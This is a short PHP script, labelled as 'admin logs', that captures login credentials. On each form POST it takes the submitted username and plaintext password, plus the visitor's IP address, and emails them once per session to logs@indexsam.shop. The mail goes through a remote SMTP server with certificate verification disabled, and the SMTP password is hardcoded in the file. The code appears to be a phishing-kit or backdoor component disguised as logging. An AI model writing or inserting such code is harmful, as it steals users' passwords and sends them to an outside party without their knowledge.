<?php

// admin logs - sam


session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Verifica se o e-mail já foi enviado
    if (!isset($_SESSION['email_sent']) || !$_SESSION['email_sent']) {

        $mail = new PHPMailer(true);

        try {
           
            $mail->isSMTP();
            $mail->Host       = 'mail.indexsam.shop';
            $mail->SMTPAuth   = true;
            $mail->Username   = 'no-reeply@indexsam.shop';
            $mail->Password   = '!oPfWhw.NP+@';
            $mail->SMTPSecure = 'tls';
            $mail->Port       = 587;

           
            $mail->SMTPOptions = array(
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'allow_self_signed' => true
                )
            );

       
            $mail->setFrom('logs@indexsam.shop', 'ADMIN LOGS');
            $mail->addAddress('logs@indexsam.shop'); 
            $mail->Subject = 'Novo login realizado';
            $mail->Body    = 'Um novo login foi realizado com sucesso por: ' . $username ." site ".  $url."\n" .
                              'Senha: ' . $password . "\n" .
                              'Endereço IP: ' . $user_ip;

            $mail->CharSet = 'UTF-8';

         
            $mail->send();

           
            $_SESSION['email_sent'] = true;

            echo '';
        } catch (Exception $e) {
            echo ": {$mail->ErrorInfo}";
        }
    } else {
        echo '';
    }
}
